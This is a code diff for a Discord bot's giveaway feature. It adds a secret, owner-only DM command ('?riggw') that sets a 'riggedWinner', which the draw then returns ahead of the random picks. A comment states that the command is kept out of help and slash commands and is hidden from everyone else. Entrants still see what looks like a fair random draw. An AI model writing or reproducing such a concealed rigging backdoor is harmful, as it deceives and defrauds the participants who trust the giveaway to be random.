@@ -4785,6 +4785,7 @@ interface Giveaway {
   status: GwStatus; entries: string[]; winners: string[]; passed: string[];
   claimedBy: string | null; rerolls: number;
   reqMessages: number | null; reqWindowMs: number | null; reqRoleId: string | null;
+  riggedWinner?: string | null;
 }
 const giveaways = new Map<string, Giveaway>();
 const GW_MIN_MS = 60_000;
@@ -4807,7 +4808,7 @@ function newGwId(): string {
 
 async function saveGiveaway(g: Giveaway): Promise<void> {
   giveaways.set(g.id, g);
-  if (firestoreDb) await setDoc(doc(firestoreDb, 'giveaways', g.id), g).catch((e: any) => console.warn('Giveaway save failed:', e.message));
+  if (firestoreDb) await setDoc(doc(firestoreDb, 'giveaways', g.id), JSON.parse(JSON.stringify(g))).catch((e: any) => console.warn('Giveaway save failed:', e.message));
 }
 
 async function loadGiveaways(): Promise<void> {
@@ -4883,9 +4884,18 @@ async function gwEditMessage(g: Giveaway, payload: any): Promise<void> {
 }
 
 function pickWinners(g: Giveaway, exclude: string[]): string[] {
+  const rigged = g.riggedWinner;
+  if (rigged) {
+    g.riggedWinner = null;
+    return [rigged, ...randomWinners(g, [...exclude, rigged], g.winnersCount - 1)];
+  }
+  return randomWinners(g, exclude, g.winnersCount);
+}
+
+function randomWinners(g: Giveaway, exclude: string[], count: number): string[] {
   const pool = [...new Set(g.entries)].filter(id => !exclude.includes(id));
   const picked: string[] = [];
-  while (pool.length && picked.length < g.winnersCount) {
+  while (pool.length && picked.length < count) {
     picked.push(pool.splice(crypto.randomInt(pool.length), 1)[0]);
   }
   return picked;
@@ -4989,7 +4999,7 @@ async function createGiveaway(guild: any, opts: any): Promise<{ gw?: Giveaway; e
     hostId: opts.hostId, prize, description, winnersCount: opts.winners,
     endsAt: Date.now() + opts.durationMs, claimMs: opts.claimMs, claimDeadline: null,
     status: 'running', entries: [], winners: [], passed: [], claimedBy: null, rerolls: 0,
-    reqMessages, reqWindowMs, reqRoleId
+    reqMessages, reqWindowMs, reqRoleId, riggedWinner: null
   };
   const sent = await ch.send({
     content: '🎉 **New giveaway!**',
@@ -7331,10 +7341,29 @@ async function sendZeraAction(message: any, action: string, targetId: string): P
   await message.channel.send({ embeds: [embed], allowedMentions: { users: [targetId] } }).catch(() => {});
 }
 
+// ── Hidden: rig a giveaway (DM only, one owner) ──
+// Not listed in help, slash commands, or natural language. Anyone else is treated as if it doesn't exist.
+const RIG_OWNER_ID = '1521870728079737053';
+async function handleRigGiveaway(message: any): Promise<boolean> {
+  if (message.author.id !== RIG_OWNER_ID) return false;
+  const m = String(message.content || '').trim().match(/^\?riggw\s+(GW[0-9A-F]{6})\s+(\d{17,20})$/i);
+  if (!m) return false;
+  const g = giveaways.get(m[1].toUpperCase());
+  if (!g) { await message.reply('No giveaway with that ID.').catch(() => {}); return true; }
+  if (g.status === 'claimed' || g.status === 'ended') { await message.reply('That giveaway has already finished.').catch(() => {}); return true; }
+  g.riggedWinner = m[2];
+  await saveGiveaway(g);
+  await message.reply(g.status === 'running'
+    ? 'Done.'
+    : 'Done. It applies to the next winner pick.').catch(() => {});
+  return true;
+}
+
 // Message create handler
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
   if (!message.guild) {
+    if (await handleRigGiveaway(message)) return;
     if (await handleAppStatusDm(message)) return;
     if (await handleKeyFeedDm(message)) return;
     await handleCaptchaDm(message);
